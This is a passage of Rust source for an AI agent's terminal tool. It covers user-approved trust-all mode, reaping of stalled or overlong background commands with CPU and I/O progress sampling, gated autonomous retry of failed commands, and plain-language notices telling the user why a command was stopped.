                    if let Some(ref pool) = self.pool {
                        if let Err(e) = sqlx::query(
                            "INSERT OR IGNORE INTO terminal_allowed_prefixes (prefix) VALUES ('*')",
                        )
                        .execute(pool)
                        .await
                        {
                            warn!("Failed to persist trust-all mode: {}", e);
                        }
                    }
                }
                Ok(
                    "Trust-all mode enabled. All commands will now run without approval prompts."
                        .to_string(),
                )
            }
            Ok(ApprovalResponse::Deny) => Ok(
                "Trust-all mode was denied. Commands will continue to require approval."
                    .to_string(),
            ),
            Err(e) => Ok(format!("Could not get approval for trust-all mode: {}", e)),
        }
    }

    fn prune_completed_map(completed: &mut HashMap<u32, CompletedProcess>) {
        const COMPLETED_TTL: Duration = Duration::from_secs(10 * 60);
        const COMPLETED_CAP: usize = 128;

        completed.retain(|_, entry| entry.completed_at.elapsed() <= COMPLETED_TTL);
        if completed.len() <= COMPLETED_CAP {
            return;
        }

        let mut by_age: Vec<(u32, Instant)> = completed
            .iter()
            .map(|(pid, entry)| (*pid, entry.completed_at))
            .collect();
        by_age.sort_by_key(|(_, ts)| *ts);
        let to_remove = by_age.len().saturating_sub(COMPLETED_CAP);
        for (pid, _) in by_age.into_iter().take(to_remove) {
            completed.remove(&pid);
        }
    }

    /// Clean up any background processes whose reader tasks have finished.
    /// Finished outputs are retained briefly in `completed` so follow-up
    /// `action="check"` can still retrieve the final result.
    async fn reap_finished(&self) {
        let finished: Vec<(u32, RunningProcess)> = {
            let mut running = self.running.lock().await;
            let pids: Vec<u32> = running
                .iter()
                .filter(|(_, p)| p.reader_handle.is_finished())
                .map(|(pid, _)| *pid)
                .collect();
            let mut removed = Vec::with_capacity(pids.len());
            for pid in pids {
                if let Some(proc) = running.remove(&pid) {
                    removed.push((pid, proc));
                }
            }
            removed
        };

        if finished.is_empty() {
            return;
        }

        for (pid, proc) in finished {
            self.remove_indexes_for_process(pid, &proc).await;
            let exit_code = proc.reader_handle.await.ok().flatten();
            let stdout = String::from_utf8_lossy(&proc.stdout_buf.lock().await).to_string();
            let stderr = String::from_utf8_lossy(&proc.stderr_buf.lock().await).to_string();
            let mut output = format!(
                "[Process pid={} finished after {:.0}s]\n",
                pid,
                proc.started_at.elapsed().as_secs_f64()
            );
            let (formatted, truncation) = format_output(&stdout, &stderr, self.max_output_chars);
            output.push_str(&formatted);
            if let Some(code) = exit_code {
                if code != 0 {
                    output.push_str(&format!("\n[exit code: {}]", code));
                }
            }

            let mut metadata = tracked_background_metadata(proc.detached, false, exit_code);
            metadata.truncation = truncation;
            let mut completed = self.completed.lock().await;
            completed.insert(
                pid,
                CompletedProcess {
                    output,
                    metadata,
                    completed_at: Instant::now(),
                },
            );
            Self::prune_completed_map(&mut completed);
            info!(pid, command = %proc.command, "Reaped finished background process");
        }
    }

    /// Determine the bounded `working_dir` handed to the correction bridge for a
    /// reaped background command, then canonicalize it.
    ///
    /// We do NOT know the actual project scope of a reaped command — terminal
    /// commands run via `sh -c` inheriting the daemon's cwd, and neither
    /// `RunningProcess` nor the owning task/goal record a project directory. The
    /// honest "working_dir we have" is therefore the daemon's current working
    /// directory. Per the bridge contract we pass it through unchanged in spirit
    /// (no `$HOME` substitution to force a dispatch) and rely on the bridge's
    /// `is_unsafe_correction_working_dir` gate to REFUSE when that turns out to be
    /// `/`, `$HOME`, or unbounded — the correct safe outcome.
    ///
    /// Canonicalization is done HERE because the bridge guard does not canonicalize:
    /// resolving `.`/`..`/symlinks before the guard sees the path is what lets the
    /// equality checks (`== "/"`, `== $HOME`) fire reliably. If canonicalization
    /// fails (path missing), we fall back to the raw cwd so the guard still runs.
    fn correction_working_dir() -> std::path::PathBuf {
        let raw = std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from("/"));
        std::fs::canonicalize(&raw).unwrap_or(raw)
    }

    /// Attempt autonomous remediation for a just-reaped hung background command.
    ///
    /// Returns `true` only when a remediation task was actually dispatched (live
    /// mode, safe scope, factory accepted) — in which case the caller sends a
    /// quieter "retrying a different way" note instead of the alarming "stopped,
    /// no results" message. Returns `false` for every other outcome
    /// (correction disabled, no agent wired, unsafe scope, shadow mode, factory
    /// refused, or any error), in which case the caller MUST send the existing
    /// user notification — byte-identical to today.
    ///
    /// This is best-effort and self-contained: any failure to remediate one
    /// reaped process is swallowed here so it can never break reaping of others.
    async fn try_dispatch_idle_reap_remediation(
        &self,
        command: &str,
        session_id: &str,
        owner_task_id: Option<&str>,
        idle_secs: u64,
    ) -> bool {
        use crate::agent::correction_dispatch::{
            decide_correction_bridge_action, dispatch_correction_remediation,
            CorrectionBridgeAction,
        };
        use crate::agent::correction_intent::reconstruct_subject_context;
        use crate::traits::SelfCorrectionSubjectKind;

        // Fast exit when the bridge is off — keeps behavior byte-identical and
        // avoids upgrading the agent Weak / touching the event store needlessly.
        if !self.self_correction.enabled {
            return false;
        }

        // 1. Reach the agent (and through it the event store + state). No agent
        //    wired (e.g. unit tests that build TerminalTool directly) → skip
        //    remediation, keep the existing notification.
        let Some(agent) = self.agent.get().and_then(|w| w.upgrade()) else {
            return false;
        };

        // 2. Working_dir for the retry, derived from the FAILED command's actual
        //    target scope (home / `/` / a bounded dir; canonicalized). The gate
        //    refuses only genuinely-invalid scopes — broad read-only scopes are
        //    allowed and protected by the sandbox's read-only + sensitive-file
        //    guards.
        let working_dir = derive_correction_scope_from_command(command);

        // 3. Recent history for subject reconstruction (best-effort; an empty
        //    history just yields the generic original-request fallback).
        let history = agent
            .event_store()
            .get_conversation_history(session_id, 50)
            .await
            .unwrap_or_default();

        // Subject id: prefer the owning task id, fall back to the session id.
        let subject_id = owner_task_id
            .filter(|id| !id.trim().is_empty())
            .unwrap_or(session_id);

        let subject = reconstruct_subject_context(
            &history,
            session_id,
            subject_id,
            SelfCorrectionSubjectKind::BackgroundCommand,
            working_dir.clone(),
            command,
        );

        // 4. Decide. Disabled was handled above; Disabled/UnsafeScope/Shadowed
        //    all fall through to the existing notification (return false).
        match decide_correction_bridge_action(&self.self_correction, &subject, command, idle_secs) {
            CorrectionBridgeAction::Disabled | CorrectionBridgeAction::UnsafeScope => false,
            CorrectionBridgeAction::Shadowed { .. } => {
                info!(
                    reconstructed_request = %subject.original_request,
                    working_dir = %working_dir.display(),
                    command = %truncate_str(command, 160),
                    idle_secs,
                    "SHADOW: would dispatch correction remediation"
                );
                false
            }
            CorrectionBridgeAction::Dispatch { remediation_prompt } => {
                let state = agent.state_arc();
                let hub = self.hub.get().cloned();
                match dispatch_correction_remediation(
                    agent,
                    state,
                    hub,
                    &self.self_correction,
                    subject,
                    remediation_prompt,
                )
                .await
                {
                    Ok(Some(goal_id)) => {
                        info!(
                            %goal_id,
                            working_dir = %working_dir.display(),
                            command = %truncate_str(command, 160),
                            idle_secs,
                            "Dispatched autonomous remediation for idle-reaped command"
                        );
                        true
                    }
                    Ok(None) => {
                        // Factory refused (kill-switch / no-bypass) — fall back to
                        // the existing notification.
                        false
                    }
                    Err(e) => {
                        warn!(error = %e, "Correction remediation dispatch failed; falling back to notification");
                        false
                    }
                }
            }
        }
    }

    /// Stop disowned background processes that have gone idle (no new output for
    /// `idle_threshold`). Driven by the heartbeat so there is a single, observable
    /// owner for this resource-leak class — the per-process notifier only delivers
    /// on *exit*, so a command that never exits (e.g. a whole-disk `du`/`find`
    /// scan) would otherwise pin a notifier task and disk I/O indefinitely.
    ///
    /// Only `notifier_active && !detached` processes are eligible. Any process
    /// still streaming output keeps resetting its idle clock and is never reaped;
    /// detached processes (dev servers) are exempt entirely. Returns the number of
    /// processes stopped.
    ///
    /// Convenience wrapper around [`Self::reap_stale_background_processes_with`]
    /// that uses the default max-runtime backstop ([`BACKGROUND_MAX_RUNTIME_SECS`]).
    /// Production wiring (core.rs) calls the two-arg form so both knobs come from
    /// config; this single-arg form is retained for tests that only exercise the
    /// stall path.
    #[cfg(test)]
    pub async fn reap_stale_background_processes(&self, stall_threshold: Duration) -> usize {
        self.reap_stale_background_processes_with(
            stall_threshold,
            Duration::from_secs(BACKGROUND_MAX_RUNTIME_SECS),
        )
        .await
    }

    /// Sample cumulative (CPU-ms, disk-IO-bytes) for each pid via `sysinfo`.
    ///
    /// Cross-platform: `sysinfo` covers macOS/Linux/Windows, so there are no
    /// per-OS `cfg` blocks. A pid that has exited (or that the OS won't stat)
    /// simply has no map entry — the caller treats a missing sample as "no
    /// progress signal from CPU/IO" and falls back to output-based progress.
    ///
    /// The returned value for each tracked root pid is the SUM of cumulative CPU
    /// time + disk I/O across that pid AND all its transitive descendants.
    /// Background commands run via `sh -c '<pipeline>'`, so the tracked pid is
    /// the idle `sh` wrapper while the real work (`du`/`find`/`sort`/`head`)
    /// runs in its children. Sampling only the wrapper would see zero CPU/IO and
    /// false-reap a busy command; summing the subtree counts the working child's
    /// progress against the tracked wrapper pid.
    ///
    /// Cost note: refreshing ALL processes once per call is heavier than
    /// refreshing only the tracked pids, but the reaper sweep runs at most once
    /// per 60s, so a single full-process refresh (cpu + disk only) per sweep is
    /// an acceptable, bounded cost. The parent→children index and subtree
    /// traversal are O(total processes), trivial at typical process counts.
    fn sample_process_resources(pids: &[u32]) -> HashMap<u32, (u64, u64)> {
        use sysinfo::{ProcessRefreshKind, ProcessesToUpdate, System};

        if pids.is_empty() {
            return HashMap::new();
        }

        // Refresh ALL processes (not just the tracked roots) so descendant
        // CPU/IO is visible. cpu + disk only — we never need names/cmdlines here.
        let mut sys = System::new();
        sys.refresh_processes_specifics(
            ProcessesToUpdate::All,
            true,
            ProcessRefreshKind::nothing().with_cpu().with_disk_usage(),
        );

        // Build a flat per-pid sample map and a parent→children index from the
        // full snapshot, then delegate the subtree summing to the pure helper.
        let procs = sys.processes();
        let mut per_pid: HashMap<u32, (u64, u64)> = HashMap::with_capacity(procs.len());
        let mut children_of: HashMap<u32, Vec<u32>> = HashMap::new();
        for (pid, proc) in procs {
            let pid_u32 = pid.as_u32();
            let cpu_ms = proc.accumulated_cpu_time();
            let du = proc.disk_usage();
            let io_bytes = du.total_read_bytes.saturating_add(du.total_written_bytes);
            per_pid.insert(pid_u32, (cpu_ms, io_bytes));
            if let Some(parent) = proc.parent() {
                children_of
                    .entry(parent.as_u32())
                    .or_default()
                    .push(pid_u32);
            }
        }

        sum_subtree_resources(pids, &children_of, &per_pid)
    }

    /// Stall + max-runtime variant. `stall_threshold`: reap after no
    /// progress (CPU/IO/output) for this long. `max_runtime`: reap regardless of
    /// progress once total runtime reaches this (busy-loop / too-slow backstop).
    pub async fn reap_stale_background_processes_with(
        &self,
        stall_threshold: Duration,
        max_runtime: Duration,
    ) -> usize {
        // Phase 1: snapshot eligible candidates under the `running` lock. Clone the
        // buffer Arcs so Phase 2 can measure output WITHOUT holding `running`
        // (lock-order discipline: never hold `running` while locking a buffer).
        struct Candidate {
            pid: u32,
            stdout_buf: Arc<Mutex<Vec<u8>>>,
            stderr_buf: Arc<Mutex<Vec<u8>>>,
            last_progress_len: usize,
            last_progress_at: Instant,
            last_cpu_ms: u64,
            last_io_bytes: u64,
            started_at: Instant,
        }
        let candidates: Vec<Candidate> = {
            let running = self.running.lock().await;
            running
                .iter()
                .filter(|(_, p)| p.notifier_active && !p.detached)
                .map(|(pid, p)| Candidate {
                    pid: *pid,
                    stdout_buf: p.stdout_buf.clone(),
                    stderr_buf: p.stderr_buf.clone(),
                    last_progress_len: p.last_progress_len,
                    last_progress_at: p.last_progress_at,
                    last_cpu_ms: p.last_cpu_ms,
                    last_io_bytes: p.last_io_bytes,
                    started_at: p.started_at,
                })
                .collect()
        };
        if candidates.is_empty() {
            return 0;
        }

        // Phase 2: sample resources + output (no `running` lock held). A process
        // is "making progress" if ANY of CPU time / disk I/O / output grew; that
        // refreshes its progress clock. A process making no progress past the
        // stall threshold — OR any process whose total runtime hit max_runtime —
        // is reaped (max-runtime is the busy-loop / too-slow backstop).
        let pids: Vec<u32> = candidates.iter().map(|c| c.pid).collect();
        let samples = Self::sample_process_resources(&pids);

        // Updates for processes that made progress: (pid, output_len, cpu_ms, io_bytes).
        let mut to_grow: Vec<(u32, usize, u64, u64)> = Vec::new();
        let mut to_reap: Vec<(u32, ReapReason)> = Vec::new();
        for c in candidates {
            let len = c.stdout_buf.lock().await.len() + c.stderr_buf.lock().await.len();
            // Missing sample (process gone / OS denied) → carry previous values
            // forward so a missing CPU/IO signal contributes nothing and we fall
            // back to output-based progress only.
            let (cpu_ms, io_bytes) = samples
                .get(&c.pid)
                .copied()
                .unwrap_or((c.last_cpu_ms, c.last_io_bytes));

            let made_progress = process_made_progress(
                c.last_cpu_ms,
                cpu_ms,
                c.last_io_bytes,
                io_bytes,
                c.last_progress_len,
                len,
            );

            let total_runtime = c.started_at.elapsed();
            let no_progress_elapsed = if made_progress {
                Duration::ZERO
            } else {
                c.last_progress_at.elapsed()
            };

            if should_idle_reap(
                true,
                false,
                no_progress_elapsed,
                total_runtime,
                stall_threshold,
                max_runtime,
            ) {
                let reason =
                    if total_runtime >= max_runtime && no_progress_elapsed < stall_threshold {
                        ReapReason::MaxRuntime
                    } else {
                        ReapReason::Stalled
                    };
                to_reap.push((c.pid, reason));
            } else if made_progress {
                // Refresh bookkeeping for a genuinely-working process.
                to_grow.push((c.pid, len, cpu_ms, io_bytes));
            }
        }

        // Phase 3a: refresh progress bookkeeping for processes that advanced.
        if !to_grow.is_empty() {
            let now = Instant::now();
            let mut running = self.running.lock().await;
            for (pid, len, cpu_ms, io_bytes) in to_grow {
                if let Some(proc) = running.get_mut(&pid) {
                    proc.last_progress_len = len;
                    proc.last_cpu_ms = cpu_ms;
                    proc.last_io_bytes = io_bytes;
                    proc.last_progress_at = now;
                }
            }
        }

        // Phase 3b: stop the stale ones. Mirror `handle_kill`: remove from `running`,
        // drop indexes, notify the user (the notifier is suppressed by
        // `terminate_running_process`, so the reaper owns delivery), then terminate.
        let mut reaped = 0usize;
        for (pid, reason) in to_reap {
            let proc = {
                let mut running = self.running.lock().await;
                running.remove(&pid)
            };
            let Some(proc) = proc else { continue };
            self.remove_indexes_for_process(pid, &proc).await;
            self.completed.lock().await.remove(&pid);

            let session_id = proc.notify_session_id.clone();
            let goal_id = proc.notify_goal_id.clone();
            let command_summary = truncate_str(&proc.command, 160);
            // Full command + owning task id are captured here because `proc` is
            // moved into `terminate_running_process` below; the correction bridge
            // needs the untruncated command and the task scope.
            let proc_command = proc.command.clone();
            let owner_task_id = proc.owner_task_id.clone();
            // For the stall path, idle_secs = time since last progress. For the
            // max-runtime path, the meaningful number is total runtime.
            let idle_secs = proc.last_progress_at.elapsed().as_secs();
            let runtime_secs = proc.started_at.elapsed().as_secs();

            warn!(
                pid,
                command = %proc.command,
                idle_secs,
                runtime_secs,
                reason = reason.as_str(),
                "Idle-reaping background process (no CPU/disk/output progress, or max runtime reached)"
            );

            if let Err(e) = self
                .terminate_running_process(pid, proc, reason.terminate_reason())
                .await
            {
                warn!(pid, error = %e, "Failed to terminate idle background process");
            }

            // Close the loop with the user: the screenshot's failure was the bot
            // silently waiting forever. Tell them it was stopped and why.
            if !session_id.is_empty() {
                // Self-correction bridge: when enabled+safe+live, dispatch an
                // autonomous remediation instead of the alarming "stopped, no
                // results" message. Best-effort and per-process — a failure to
                // remediate this one process never breaks reaping of the others
                // (all error paths inside return `false`, falling back to the
                // existing notification). When correction is off/unsafe/shadow,
                // this is a no-op and the message below is byte-identical to
                // today.
                // The elapsed figure handed to the correction bridge: time-since-
                // progress for a stall, total runtime for the max-runtime backstop.
                let reason_secs = match reason {
                    ReapReason::Stalled => idle_secs,
                    ReapReason::MaxRuntime => runtime_secs,
                };
                let remediating = self
                    .try_dispatch_idle_reap_remediation(
                        &proc_command,
                        &session_id,
                        owner_task_id.as_deref(),
                        reason_secs,
                    )
                    .await;

                // Task 6: honest closeout for an unfulfilled deliverable. If this
                // command was structured to produce an explicit output file
                // (attributable) but the file never appeared and nothing was
                // delivered for this session, say so plainly instead of the generic
                // whole-disk-scan guidance — that command was not a scan, it was
                // supposed to hand back a file. Skipped when remediation is running
                // (it will follow up) or when nothing is attributable (servers,
                // watchers, scans → unchanged behavior).
                let unfulfilled_deliverable: Option<String> = if remediating {
                    None
                } else {
                    let command_end = std::time::SystemTime::now();
                    let command_start = command_end
                        .checked_sub(Duration::from_secs(runtime_secs))
                        .unwrap_or(command_end);
                    match attribute_background_deliverable(
                        &session_id,
                        &proc_command,
                        command_start,
                        command_end,
                        self.plan_store.get(),
                    )
                    .await
                    {
                        DeliverableAttribution::One(path) => {
                            let file_appeared = std::fs::metadata(&path).is_ok();
                            let already_delivered = self
                                .delivered_deliverables
                                .lock()
                                .await
                                .get(&(session_id.clone(), path.to_string_lossy().to_string()))
                                == Some(&DeliverableDeliveryState::Delivered);
                            if !file_appeared && !already_delivered {
                                Some(
                                    path.file_name()
                                        .map(|f| f.to_string_lossy().to_string())
                                        .unwrap_or_else(|| path.to_string_lossy().to_string()),
                                )
                            } else {
                                None
                            }
                        }
                        DeliverableAttribution::ExpectedMissing(paths) => {
                            paths.first().map(|path| {
                                path.file_name()
                                    .map(|f| f.to_string_lossy().to_string())
                                    .unwrap_or_else(|| path.to_string_lossy().to_string())
                            })
                        }
                        DeliverableAttribution::Ambiguous(_)
                        | DeliverableAttribution::Hints(_)
                        | DeliverableAttribution::None => None,
                    }
                };

                // Reason-specific phrasing. Both keep the existing "stopped a
                // background command" / scoping-guidance shape so the user always
                // gets actionable next steps.
                let message = if let Some(filename) = unfulfilled_deliverable {
                    match reason {
                        ReapReason::Stalled => format!(
                            "⚠️ I stopped a background command because it stopped making \
                             progress (no CPU/disk activity for {}): `{}`. The expected \
                             output file `{}` never appeared, so there's nothing to send. \
                             You may want to re-run it or check why it didn't produce the file.",
                            humanize_elapsed(idle_secs),
                            command_summary,
                            filename
                        ),
                        ReapReason::MaxRuntime => format!(
                            "⚠️ I stopped a background command because it ran for over {} \
                             without finishing: `{}`. The expected output file `{}` never \
                             appeared, so there's nothing to send. You may want to re-run it \
                             or check why it didn't produce the file.",
                            humanize_elapsed(runtime_secs),
                            command_summary,
                            filename
                        ),
                    }
                } else if remediating {
                    match reason {
                        ReapReason::Stalled => format!(
                            "⚠️ That background command stopped making progress \
                             (no CPU/disk activity for {}): `{}`. I'm retrying this a \
                             different way — I'll follow up with the result.",
                            humanize_elapsed(idle_secs),
                            command_summary
                        ),
                        ReapReason::MaxRuntime => format!(
                            "⚠️ That background command ran for over {} without finishing: \
                             `{}`. I'm retrying this a different way — I'll follow up with \
                             the result.",
                            humanize_elapsed(runtime_secs),
                            command_summary
                        ),
                    }
                } else {
                    match reason {
                        ReapReason::Stalled => format!(
                            "⚠️ I stopped a background command because it stopped making \
                             progress (no CPU/disk activity for {}): `{}`. Whole-disk scans \
                             are very slow — if you still need this, try narrowing the search \
                             (a specific folder, a size filter, or a depth limit).",
                            humanize_elapsed(idle_secs),
                            command_summary
                        ),
                        ReapReason::MaxRuntime => format!(
                            "⚠️ I stopped a background command because it ran for over {} \
                             without finishing: `{}`. Whole-disk scans are very slow — if you \
                             still need this, try narrowing the search (a specific folder, a \
                             size filter, or a depth limit).",
                            humanize_elapsed(runtime_secs),
                            command_summary
                        ),
                    }
                };
                let mut delivered = false;
                if let Some(hub) = self.get_hub() {
                    if hub.send_text(&session_id, &message).await.is_ok() {
                        delivered = true;
                    }
                }
                if !delivered {
                    if let Some(ref state) = self.state {
                        let entry = crate::traits::NotificationEntry::new(
                            &goal_id,
                            &session_id,
                            "progress",
                            &message,
                        );
                        if let Err(e) = state.enqueue_notification(&entry).await {
                            warn!(pid, error = %e, "Failed to enqueue idle-reap notice");
                        }
                    }
                }
            }
            reaped += 1;
        }
        reaped
    }

    /// Run a command: spawn, wait up to initial_timeout, return output or move to background.
    async fn handle_run(
        &self,
        command: &str,
        notify_session_id: &str,
        notify_goal_id: Option<&str>,
        task_id: Option<&str>,
        detach: bool,
        status_tx: Option<mpsc::Sender<StatusUpdate>>,
    ) -> anyhow::Result<ToolCallOutcome> {
        let dedupe_key =
            Self::dedupe_key_for_run(command, notify_session_id, notify_goal_id, task_id);
        if let Some(existing_pid) = self.resolve_duplicate_running_pid(&dedupe_key).await {
            return Ok(ToolCallOutcome::from_output(format!(
                "Equivalent command is already running in this scope (pid={}). \
                 Use action=\"check\" pid={} to inspect progress or action=\"kill\" pid={} to stop it.",
                existing_pid, existing_pid, existing_pid
            )));
        }

        let mut cmd = tokio::process::Command::new("sh");
        cmd.arg("-c")
            .arg(command)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());
        configure_command_for_process_group(&mut cmd);
        let mut child = cmd.spawn()?;

        let pid = child.id().unwrap_or(0);

        let stdout_pipe = child.stdout.take().expect("stdout piped");
        let stderr_pipe = child.stderr.take().expect("stderr piped");

        let stdout_buf = Arc::new(Mutex::new(Vec::new()));
        let stderr_buf = Arc::new(Mutex::new(Vec::new()));

        let stdout_buf_c = stdout_buf.clone();
        let stderr_buf_c = stderr_buf.clone();
        let (completion_tx, completion_rx) = tokio::sync::oneshot::channel::<Option<i32>>();

        // Spawn a task that drains both streams and then waits for the child to exit.
        let reader_handle = tokio::spawn(async move {
            let stdout_drain = drain_to_buffer(stdout_pipe, stdout_buf_c);
            let stderr_drain = drain_to_buffer(stderr_pipe, stderr_buf_c);
            tokio::join!(stdout_drain, stderr_drain);
            let exit_code = child.wait().await.ok().and_then(|status| status.code());
            let _ = completion_tx.send(exit_code);
            exit_code
        });

        // Wait up to initial_timeout for the reader (and thus the process) to finish.
        let poll_finished = async {
            loop {
                if reader_handle.is_finished() {
                    return;
                }
                tokio::time::sleep(Duration::from_millis(50)).await;
            }
        };

        match tokio::time::timeout(self.initial_timeout, poll_finished).await {
            Ok(()) => {
                // Process finished within timeout — collect output.
                let exit_code = reader_handle.await.ok().flatten();
                let stdout_data = stdout_buf.lock().await;
                let stderr_data = stderr_buf.lock().await;
                let stdout = String::from_utf8_lossy(&stdout_data);
                let stderr = String::from_utf8_lossy(&stderr_data);
                let (mut output, truncation) =
                    format_output(&stdout, &stderr, self.max_output_chars);
                if let Some(code) = exit_code {
                    if code != 0 {
                        output.push_str(&format!("\n[exit code: {}]", code));
                    }
                }
                let mut metadata = foreground_terminal_metadata(exit_code);
                metadata.truncation = truncation;
                Ok(ToolCallOutcome { metadata, output })
            }
            Err(_) => {
                // Timeout — check if this is a daemon/background command where the
                // parent shell exited but pipes are held open by the detached child.
                // In that case the reader task will never finish naturally, so capture
                // partial output and return immediately instead of entering the
                // infinite background tracking loop.
                let daemon_hits = detect_daemonization_primitives(command);
                if !daemon_hits.is_empty() {
                    let partial_stdout = {
                        let b = stdout_buf.lock().await;
                        String::from_utf8_lossy(&b).to_string()
                    };
                    let partial_stderr = {
                        let b = stderr_buf.lock().await;
                        String::from_utf8_lossy(&b).to_string()
                    };
                    let (formatted, truncation) =
                        format_output(&partial_stdout, &partial_stderr, self.max_output_chars);
                    reader_handle.abort();
                    let output = format!(
                        "Detached background command launched (pid={}).\n\
                         The process is running independently and is not task-owned.\n\
                         This detached daemonized process is not tracked by action=\"check\"/\"kill\".\n\n\
                         Initial output:\n{}",
                        pid, formatted
                    );
                    return Ok(ToolCallOutcome {
                        metadata: ToolCallMetadata {
                            background_started: true,
                            detached: true,
                            timed_out: false,
                            completion_notifications_enabled: false,
                            truncation,
                            ..ToolCallMetadata::default()
                        },
                        output,
                    });
                }

                // Non-daemon command: move process to background tracking.
                let elapsed = self.initial_timeout.as_secs();
                let partial_stdout = {
                    let b = stdout_buf.lock().await;
                    let tail = if b.len() > 500 {
                        &b[b.len() - 500..]
                    } else {
                        &b
                    };
                    String::from_utf8_lossy(tail).to_string()
                };
                let notify_on_completion = Arc::new(AtomicBool::new(true));
                let owner_task_id = task_id
                    .map(str::to_string)
                    .filter(|id| !id.trim().is_empty());

                let proc = RunningProcess {
                    command: command.to_string(),
                    dedupe_key: Some(dedupe_key.clone()),
                    owner_task_id: owner_task_id.clone(),
                    detached: detach,
                    started_at: Instant::now() - self.initial_timeout,
                    stdout_buf,
                    stderr_buf,
                    reader_handle,
                    child_id: pid,
                    notify_on_completion: notify_on_completion.clone(),
                    notifier_active: false,
                    notify_session_id: notify_session_id.trim().to_string(),
                    notify_goal_id: notify_goal_id.unwrap_or("").to_string(),
                    last_progress_len: 0,
                    last_progress_at: Instant::now(),
                    last_cpu_ms: 0,
                    last_io_bytes: 0,
                };

                self.running.lock().await.insert(pid, proc);
                self.insert_indexes_for_process(
                    pid,
                    Some(&dedupe_key),
                    owner_task_id.as_deref(),
                    detach,
                )
                .await;

                // Deterministic completion delivery: notify user when background command finishes
                // even if the agent loop ends before an explicit `action="check"` call.
                // Also re-engages the agent loop so it can process the output and continue
                // working on the original task.
                let mut notifier_started = false;
                let state_for_notify = self.state.clone();
                // Pool clone so the notifier can read the durable requirement
                // checklist and inject still-unchecked items into re-engagement.
                let pool_for_notify = self.pool.clone();
                let hub_for_notify = self.get_hub();
                let agent_for_notify = self.agent.get().and_then(|w| w.upgrade());
                let reengagements_for_notify = self.reengagements.clone();
                let recent_background_deliveries_for_notify =
                    self.recent_background_deliveries.clone();
                // Deliver-once ledger + delivery dirs + durable plan store for
                // harness-side deliverable attribution and direct file delivery.
                let delivered_deliverables_for_notify = self.delivered_deliverables.clone();
                let plan_store_for_notify = self.plan_store.get().cloned();
                let inbox_dir_for_notify = self.inbox_dir.clone();
                let outbox_dirs_for_notify = self.outbox_dirs.clone();
                // Cloned for the notifier task so it can remove the finished process
                // from `running` (and its indexes) after delivery, preventing the
                // idle-reaper from sending a contradictory "stopped, no results" message
                // for a process that already delivered its output.
                let running_for_notify = self.running.clone();
                let running_by_dedupe_key_for_notify = self.running_by_dedupe_key.clone();
                let task_processes_for_notify = self.task_processes.clone();
                let dedupe_key_for_notify = dedupe_key.clone();
                let owner_task_id_for_notify = owner_task_id.clone();
                if state_for_notify.is_some() || hub_for_notify.is_some() {
                    let goal_id_for_notify = notify_goal_id.unwrap_or("").to_string();
                    let session_for_notify = notify_session_id.trim().to_string();
                    let command_for_notify = command.to_string();
                    let stdout_for_notify = {
                        let running = self.running.lock().await;
                        running.get(&pid).map(|p| p.stdout_buf.clone())
                    };
                    let stderr_for_notify = {
                        let running = self.running.lock().await;
                        running.get(&pid).map(|p| p.stderr_buf.clone())
                    };
                    let started_at_for_notify = Instant::now() - self.initial_timeout;
                    let max_output_chars = self.max_output_chars;
                    let status_tx_for_notify = status_tx.clone();
                    if let (Some(stdout_buf), Some(stderr_buf)) =
                        (stdout_for_notify, stderr_for_notify)
                    {
                        tokio::spawn(async move {
                            if session_for_notify.is_empty() {
                                warn!(
                                    pid,
                                    command = %command_for_notify,
                                    "Terminal background notifier skipped enqueue due to empty session id"
                                );
                                notify_on_completion.store(false, Ordering::Relaxed);
                                return;
                            }
                            let command_summary = truncate_str(
                                &command_for_notify
                                    .split_whitespace()
                                    .collect::<Vec<_>>()
                                    .join(" "),
                                160,
                            );

                            let mut completion_rx = completion_rx;
                            // Capture completion output for agent re-engagement
                            #[allow(unused_assignments)]
                            let mut completion_output_for_agent: Option<String> = None;
                            let mut ping_interval = tokio::time::interval(Duration::from_secs(
                                BACKGROUND_PROGRESS_INTERVAL_SECS,
                            ));
                            ping_interval
                                .set_missed_tick_behavior(tokio::time::MissedTickBehavior::Skip);
                            // Consume the immediate first tick; we want periodic pings only.
                            ping_interval.tick().await;
                            let mut ping_count: u32 = 0;
                            // One-time notice for processes that outlive all
                            // periodic pings (dev servers, watchers): without it
                            // the notifier goes silent waiting for an exit that
                            // may never come and the conversation dead-ends.
                            let mut still_running_notice_sent = false;
                            // Last output already shown to the user in a periodic
                            // ping. Used to suppress redundant "still running, no
                            // new output" channel messages (the agent already told
                            // the user the command is running).
                            let mut last_pinged_output: Option<String> = None;
                            // Set in the completion arm. Attributed deliverables suppress
                            // the generic "finished" ping and resolve to direct delivery
                            // or an honest ambiguity/failure message.
                            let deliverable_attribution: DeliverableAttribution;
                            let direct_deliverable_delivery: bool;

                            loop {
                                tokio::select! {
                                    exit = &mut completion_rx => {
                                        let exit_code = match exit {
                                            Ok(code) => code,
                                            Err(e) => {
                                                warn!(
                                                    pid,
                                                    error = %e,
                                                    command = %command_for_notify,
                                                    "Terminal background notifier lost completion signal"
                                                );
                                                None
                                            }
                                        };
                                        if !notify_on_completion.load(Ordering::Relaxed) {
                                            warn!(
                                                pid,
                                                command = %command_for_notify,
                                                "Terminal background notifier suppressed (check/kill already handled notification)"
                                            );
                                            return;
                                        }

                                        let stdout = String::from_utf8_lossy(&stdout_buf.lock().await).to_string();
                                        let stderr = String::from_utf8_lossy(&stderr_buf.lock().await).to_string();
                                        // Background delivery bypasses the agent loop
                                        // entirely, so the truncation notice is
                                        // rendered inline here immediately (the
                                        // loop's single render site will never see
                                        // this text).
                                        let (formatted, truncation) =
                                            format_output(&stdout, &stderr, max_output_chars);
                                        let mut with_notice = formatted;
                                        if let Some(info) = truncation {
                                            with_notice.push('\n');
                                            with_notice
                                                .push_str(&crate::utils::render_truncation_notice(&info));
                                        }
                                        let output = truncate_with_note(&with_notice, 2500);
                                        let elapsed_secs = started_at_for_notify.elapsed().as_secs();

                                        // Deliverable attribution: if the command produced exactly
                                        // one safe explicit output file, deliver THAT file directly
                                        // after the loop and suppress the generic "finished" ping +
                                        // model re-engagement (the file is the deterministic answer).
                                        let command_end = std::time::SystemTime::now();
                                        let command_start = command_end
                                            .checked_sub(started_at_for_notify.elapsed())
                                            .unwrap_or(command_end);
                                        deliverable_attribution = attribute_background_deliverable(
                                            &session_for_notify,
                                            &command_for_notify,
                                            command_start,
                                            command_end,
                                            plan_store_for_notify.as_ref(),
                                        )
                                        .await;

                                        match &deliverable_attribution {
                                            DeliverableAttribution::One(_) if exit_code == Some(0) => {
